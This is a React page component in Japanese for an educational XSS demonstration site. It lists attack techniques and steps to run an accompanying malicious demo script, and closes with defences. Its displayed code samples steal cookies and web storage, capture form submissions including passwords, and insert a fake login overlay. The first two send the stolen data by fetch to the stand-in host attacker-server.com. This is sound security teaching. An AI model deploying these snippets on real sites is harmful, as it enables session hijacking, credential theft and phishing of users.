"use client";

export default function MaliciousJSDemo() {
  return (
    <div
      style={{
        minHeight: "100vh",
        backgroundColor: "#111827",
        color: "#fff",
        padding: "2rem",
      }}
    >
      <div style={{ maxWidth: "1000px", margin: "0 auto" }}>
        <header style={{ textAlign: "center", marginBottom: "3rem" }}>
          <h1 style={{ fontSize: "2.5rem", marginBottom: "1rem" }}>
            💀 悪意のあるJavaScriptファイル解析
          </h1>
          <p style={{ color: "#ccc", fontSize: "1.1rem" }}>
            実際のXSS攻撃で使われる手法の教育的デモンストレーション
          </p>
        </header>

        {/* 警告 */}
        <div
          style={{
            backgroundColor: "#dc2626",
            padding: "1.5rem",
            borderRadius: "8px",
            border: "1px solid #f87171",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1rem", color: "#fecaca" }}>
            ⚠️ 重要な警告
          </h2>
          <ul style={{ color: "#fecaca", lineHeight: "1.6" }}>
            <li>
              このファイル（<code>/public/malicious-demo.js</code>
              ）は教育目的でのみ作成されています
            </li>
            <li>実際のWebアプリケーションでは絶対に使用しないでください</li>
            <li>デモ実行中は個人情報の入力を避けてください</li>
            <li>ブラウザの開発者ツールでコンソールログを確認できます</li>
          </ul>
        </div>

        {/* 攻撃手法の解説 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#f59e0b" }}>
            🎯 実装されている攻撃手法
          </h2>

          <div style={{ display: "grid", gap: "1.5rem" }}>
            {[
              {
                title: "1. 個人情報の窃取",
                description:
                  "Cookie、LocalStorage、SessionStorageなどの機密情報を収集",
                risk: "高",
                color: "#ef4444",
              },
              {
                title: "2. フォームデータの盗聴",
                description:
                  "パスワードやクレジットカード情報などの入力データを傍受",
                risk: "極高",
                color: "#dc2626",
              },
              {
                title: "3. セッションハイジャック",
                description: "ユーザーのセッションクッキーを盗んでなりすまし",
                risk: "高",
                color: "#ef4444",
              },
              {
                title: "4. DOM改ざん攻撃",
                description: "Webサイトの見た目を変更して偽の情報を表示",
                risk: "中",
                color: "#f59e0b",
              },
              {
                title: "5. 偽ログインフォーム挿入",
                description: "本物そっくりの偽ログインフォームでフィッシング",
                risk: "極高",
                color: "#dc2626",
              },
              {
                title: "6. ブラウザフィンガープリンティング",
                description: "ユーザーの特定や追跡のためのデバイス情報収集",
                risk: "中",
                color: "#f59e0b",
              },
            ].map((attack, index) => (
              <div
                key={index}
                style={{
                  backgroundColor: "#374151",
                  padding: "1.5rem",
                  borderRadius: "6px",
                  border: `1px solid ${attack.color}`,
                }}
              >
                <div
                  style={{
                    display: "flex",
                    justifyContent: "space-between",
                    alignItems: "center",
                    marginBottom: "0.5rem",
                  }}
                >
                  <h3 style={{ color: attack.color, margin: 0 }}>
                    {attack.title}
                  </h3>
                  <span
                    style={{
                      backgroundColor: attack.color,
                      color: "#fff",
                      padding: "0.25rem 0.5rem",
                      borderRadius: "4px",
                      fontSize: "0.7rem",
                      fontWeight: "bold",
                    }}
                  >
                    リスク: {attack.risk}
                  </span>
                </div>
                <p style={{ color: "#d1d5db", fontSize: "0.9rem", margin: 0 }}>
                  {attack.description}
                </p>
              </div>
            ))}
          </div>
        </div>

        {/* コード例 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#3b82f6" }}>
            💻 主要な攻撃コード例
          </h2>

          <div style={{ marginBottom: "2rem" }}>
            <h3 style={{ color: "#fbbf24", marginBottom: "1rem" }}>
              🍪 セッション情報の窃取
            </h3>
            <pre
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                overflow: "auto",
                fontSize: "0.8rem",
                color: "#e5e7eb",
              }}
            >
              {`// Cookie、LocalStorage、SessionStorageを全て収集
const personalData = {
  cookies: document.cookie,
  localStorage: JSON.stringify(localStorage),
  sessionStorage: JSON.stringify(sessionStorage),
  userAgent: navigator.userAgent,
  currentURL: window.location.href,
  timestamp: new Date().toISOString()
};

// 攻撃者のサーバーに送信
fetch('https://attacker-server.com/steal', {
  method: 'POST',
  body: JSON.stringify(personalData)
});`}
            </pre>
          </div>

          <div style={{ marginBottom: "2rem" }}>
            <h3 style={{ color: "#fbbf24", marginBottom: "1rem" }}>
              🎣 フォームデータの傍受
            </h3>
            <pre
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                overflow: "auto",
                fontSize: "0.8rem",
                color: "#e5e7eb",
              }}
            >
              {`// 全てのフォーム送信を監視
document.querySelectorAll('form').forEach(form => {
  form.addEventListener('submit', function(e) {
    const formData = new FormData(form);
    const data = {};
    for (let [key, value] of formData.entries()) {
      data[key] = value;
    }
    
    // パスワードやクレジットカード情報を攻撃者に送信
    fetch('https://attacker-server.com/credentials', {
      method: 'POST',
      body: JSON.stringify(data)
    });
  });
});`}
            </pre>
          </div>

          <div>
            <h3 style={{ color: "#fbbf24", marginBottom: "1rem" }}>
              🥸 偽ログインフォームの動的挿入
            </h3>
            <pre
              style={{
                backgroundColor: "#374151",
                padding: "1rem",
                borderRadius: "4px",
                overflow: "auto",
                fontSize: "0.8rem",
                color: "#e5e7eb",
              }}
            >
              {`// 本物そっくりの偽ログインフォームを表示
const overlay = document.createElement('div');
overlay.innerHTML = \`
  <div style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; 
              background: rgba(0,0,0,0.8); z-index: 10000;">
    <form style="position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);
                  background: white; padding: 20px; border-radius: 8px;">
      <h3>セキュリティ確認</h3>
      <input type="text" placeholder="ユーザー名" required>
      <input type="password" placeholder="パスワード" required>
      <button type="submit">ログイン</button>
    </form>
  </div>
\`;
document.body.appendChild(overlay);`}
            </pre>
          </div>
        </div>

        {/* 実際の使用例 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
            marginBottom: "2rem",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#8b5cf6" }}>
            🚀 デモで試す方法
          </h2>

          <div style={{ marginBottom: "1.5rem" }}>
            <h3 style={{ color: "#a78bfa", marginBottom: "1rem" }}>
              旧DOM操作デモページ（/old）で実行:
            </h3>
            <ol style={{ color: "#d1d5db", lineHeight: "1.6" }}>
              <li>
                攻撃パターン5「
                <code>
                  &lt;script src="/malicious-demo.js"&gt;&lt;/script&gt;
                </code>
                」をクリック
              </li>
              <li>「⚠️ 危険な処理を実行」ボタンをクリック</li>
              <li>ブラウザの開発者ツール（F12）でConsoleタブを確認</li>
              <li>実行される攻撃手法をリアルタイムで観察</li>
            </ol>
          </div>

          <div style={{ marginBottom: "1.5rem" }}>
            <h3 style={{ color: "#a78bfa", marginBottom: "1rem" }}>
              Reactデモページ（/）で実行:
            </h3>
            <ol style={{ color: "#d1d5db", lineHeight: "1.6" }}>
              <li>「危険な表示」モードを選択</li>
              <li>攻撃パターン5をクリック</li>
              <li>「⚠️ 危険ログイン実行」をクリック</li>
              <li>同じ攻撃コードがReactの危険なAPIで実行される様子を確認</li>
            </ol>
          </div>

          <div
            style={{
              backgroundColor: "#1e3a8a",
              padding: "1rem",
              borderRadius: "4px",
              border: "1px solid #3b82f6",
            }}
          >
            <h4 style={{ color: "#93c5fd", marginBottom: "0.5rem" }}>
              💡 学習ポイント:
            </h4>
            <p style={{ color: "#dbeafe", fontSize: "0.9rem", margin: 0 }}>
              同じ悪意のあるコードでも、旧DOM操作では完全に実行されるのに対し、
              Reactの安全なデフォルト挙動では自動的にエスケープされて無害化されることを確認できます。
              ただし、<code>dangerouslySetInnerHTML</code>
              を使用した場合は攻撃が成功してしまいます。
            </p>
          </div>
        </div>

        {/* 対策 */}
        <div
          style={{
            backgroundColor: "#1f2937",
            padding: "2rem",
            borderRadius: "8px",
            border: "1px solid #374151",
          }}
        >
          <h2 style={{ marginBottom: "1.5rem", color: "#10b981" }}>
            🛡️ 防御策
          </h2>

          <div
            style={{
              display: "grid",
              gap: "1rem",
              gridTemplateColumns: "repeat(auto-fit, minmax(300px, 1fr))",
            }}
          >
            {[
              {
                title: "フレームワーク活用",
                points: [
                  "React/Vueのデフォルト挙動を信頼",
                  "dangerouslySetInnerHTML等の危険APIを避ける",
                  "サニタイズライブラリの使用",
                ],
              },
              {
                title: "Content Security Policy",
                points: [
                  "script-src ディレクティブで外部スクリプト制御",
                  "nonce や hash を使用した厳格な制御",
                  "report-uri でCSP違反を監視",
                ],
              },
              {
                title: "入力検証・出力エスケープ",
                points: [
                  "サーバーサイドでの入力値検証",
                  "HTML特殊文字の適切なエスケープ",
                  "コンテキストに応じたサニタイズ",
                ],
              },
              {
                title: "セキュリティヘッダー",
                points: [
                  "X-XSS-Protection の設定",
                  "X-Content-Type-Options: nosniff",
                  "Secure、HttpOnly Cookieの使用",
                ],
              },
            ].map((defense, index) => (
              <div
                key={index}
                style={{
                  backgroundColor: "#374151",
                  padding: "1rem",
                  borderRadius: "4px",
                  border: "1px solid #10b981",
                }}
              >
                <h4 style={{ color: "#34d399", marginBottom: "0.5rem" }}>
                  {defense.title}
                </h4>
                <ul
                  style={{
                    color: "#d1d5db",
                    fontSize: "0.8rem",
                    margin: 0,
                    paddingLeft: "1rem",
                  }}
                >
                  {defense.points.map((point, i) => (
                    <li key={i} style={{ marginBottom: "0.25rem" }}>
                      {point}
                    </li>
                  ))}
                </ul>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}
